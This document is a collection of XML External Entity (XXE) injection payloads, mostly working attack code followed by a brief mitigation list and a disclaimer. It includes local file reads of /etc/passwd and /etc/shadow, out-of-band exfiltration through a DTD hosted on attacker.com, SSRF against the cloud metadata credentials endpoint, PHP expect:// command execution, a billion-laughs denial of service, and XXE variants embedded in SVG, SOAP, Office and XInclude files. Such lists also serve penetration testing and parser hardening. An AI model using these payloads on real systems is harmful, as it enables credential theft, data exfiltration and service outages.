# XML External Entity (XXE) Injection Payload Examples

Below are various XXE payload examples demonstrating different attack scenarios and techniques.

## Basic XXE Payload

```xml
<!-- Basic XXE reading local file -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## Out-of-Band (OOB) XXE Payloads

### 1. Simple OOB Data Exfiltration

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

Where `evil.dtd` contains:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?exfiltrated=%file;'>">
%all;
```

### 2. OOB with Parameter Entities

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%xxe;'>">
  %eval;
  %exfiltrate;
]>
<foo>test</foo>
```

## Local DTD Inclusion (Advanced XXE)

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/shadow">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

## XXE for SSRF (Server Side Request Forgery)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

## Blind XXE Detection Payload

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

## XXE for PHP Expect Wrapper (RCE)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

## XXE to Retrieve Windows Files

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>
```

## Base64 Encoded XXE

```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

## XXE for Denial of Service (Billion Laughs)

```xml
<!DOCTYPE foo [
  <!ENTITY lol0 "lol">
  <!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

## XXE in SVG Files

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## XXE in SOAP Requests

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

## XXE in DOCX/PPTX/XLSX Files

Modify `[Content_Types].xml` in the Office document:
```xml
<!DOCTYPE Types [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  &xxe;
</Types>
```

## XXE in XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Mitigation Recommendations

1. Disable DTD processing completely
2. Use whitelist-based input validation
3. Implement SAST/DAST tools to detect XXE vulnerabilities
4. Use simpler data formats like JSON when possible
5. Keep XML processors updated to latest versions

**Note:** These payloads are for educational and defensive security purposes only. Unauthorized testing against systems you don't own is illegal.